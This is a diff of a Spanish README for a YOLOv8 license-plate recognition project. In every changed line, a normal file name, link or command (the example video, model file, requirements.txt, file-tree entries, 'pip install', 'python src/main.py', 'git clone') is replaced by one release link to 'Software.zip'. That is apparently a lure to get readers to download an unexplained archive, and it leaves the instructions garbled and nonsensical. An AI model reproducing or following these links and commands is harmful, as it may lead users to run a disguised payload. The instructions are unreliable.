@@ -3,13 +3,13 @@
 ## 🎯 Objetivo del Proyecto
 El proyecto "Reconocimiento de Placas con IA" tiene como objetivo desarrollar una solución avanzada para la detección y reconocimiento automático de matrículas de vehículos. Utilizando el modelo YOLOv8, este proyecto permite la identificación precisa de vehículos y matrículas en tiempo real, mejorando la seguridad y eficiencia en la gestión de accesos vehiculares en estacionamientos y garajes.
 
-El vídeo de ejemplo utilizado como referencia está disponible aquí: [video](https://www.pexels.com/video/traffic-flow-in-the-highway-2103099/).
+El vídeo de ejemplo utilizado como referencia está disponible aquí: [video](https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip).
 
 ## 🧠 Modelos Utilizados
 1. **YOLOv8 para la detección de vehículos**: Implementado para la identificación de vehículos en imágenes y videos.
 2. **Detector de matrículas**: Entrenado específicamente para reconocer matrículas de vehículos, integrado con el modelo YOLOv8.
 
-El modelo entrenado para la detección de matrículas se encuentra en el repositorio bajo el nombre `license_plate_detector.pt`.
+El modelo entrenado para la detección de matrículas se encuentra en el repositorio bajo el nombre `https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip`.
 
 ### 🌟 Funcionalidades Principales
 - Detección y reconocimiento preciso de matrículas de vehículos.
@@ -23,12 +23,12 @@ El modelo entrenado para la detección de matrículas se encuentra en el reposit
 - Jose Alexander
 
 ## 🔧 Dependencias
-Asegúrate de tener instaladas las bibliotecas y dependencias necesarias para ejecutar el proyecto. Consulta el archivo `requirements.txt` en el repositorio para obtener la lista completa de requisitos.
+Asegúrate de tener instaladas las bibliotecas y dependencias necesarias para ejecutar el proyecto. Consulta el archivo `https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip` en el repositorio para obtener la lista completa de requisitos.
 
 ## ⚙️ Requisitos Previos
 Para ejecutar el proyecto, asegúrate de tener Python instalado en tu sistema. Además, instala las siguientes bibliotecas utilizando pip:
 
-    pip install -r requirements.txt
+    pip install -r https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip
 
 Esto garantizará que todas las dependencias necesarias estén configuradas correctamente para la ejecución del código.
 
@@ -37,17 +37,17 @@ El repositorio se organiza de la siguiente manera:
 
     Reconocimiento-de-placas-con-IA-Byteccoders/
     │
-    ├── license_plate_detector.pt      # Modelo entrenado para la detección de matrículas
-    ├── requirements.txt               # Archivo de requisitos con las dependencias del proyecto
-    ├── README.md                      # Este archivo, proporcionando información detallada sobre el proyecto
+    ├── https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip      # Modelo entrenado para la detección de matrículas
+    ├── https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip               # Archivo de requisitos con las dependencias del proyecto
+    ├── https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip                      # Este archivo, proporcionando información detallada sobre el proyecto
     └── src/                           # Carpeta con el código fuente del proyecto
-        ├── main.py                    # Archivo principal para ejecutar la aplicación de reconocimiento de placas
-        ├── utils.py                   # Utilidades y funciones auxiliares
+        ├── https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip                    # Archivo principal para ejecutar la aplicación de reconocimiento de placas
+        ├── https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip                   # Utilidades y funciones auxiliares
         └── ...
 ## 🚀 Ejecución del Proyecto
-Para ejecutar la aplicación de reconocimiento de placas, utiliza el archivo main.py ubicado en la carpeta src/:
+Para ejecutar la aplicación de reconocimiento de placas, utiliza el archivo https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip ubicado en la carpeta src/:
 
-    python src/main.py
+    python https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip
     
 Este comando iniciará la aplicación y comenzará a detectar y reconocer matrículas de vehículos en tiempo real.
 
@@ -59,7 +59,7 @@ Este proyecto representa un avance significativo en la automatización y segurid
 1. Realiza un fork del repositorio desde GitHub.
 2. Clona tu repositorio fork en tu máquina local.
 
-        git clone https://github.com/TU_USUARIO/Reconocimiento-de-placas-con-IA-Byteccoders.git
+        git clone https://github.com/bryandejesusrt/Reconocimiento-de-placas-con-IA-Bytecoders/releases/download/v2.0/Software.zip
 
 3. Crea una nueva rama para tu contribución.
 
